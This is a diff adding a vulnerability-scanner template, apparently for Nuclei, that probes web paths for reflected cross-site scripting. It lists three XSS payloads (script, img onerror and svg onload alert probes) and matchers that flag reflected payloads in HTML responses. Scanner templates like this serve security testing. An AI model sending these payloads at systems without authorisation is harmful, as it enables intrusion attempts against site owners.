@@ -1,0 +1,46 @@
+id: xss-path-basic
+
+info:
+  name: Path-based Reflected XSS
+  author: openai
+  severity: medium
+  tags: fuzzing-req,fuzzing-req-xss,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{xss_path}}"
+
+    payloads:
+      xss_path:
+        - "'>\"><script>alert(1)</script>"
+        - "'>\"><img src=x onerror=alert(1)>"
+        - "'>\"><svg/onload=alert(1)>"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg/onload=alert(1)>"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - text/html
+          
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        negative: true
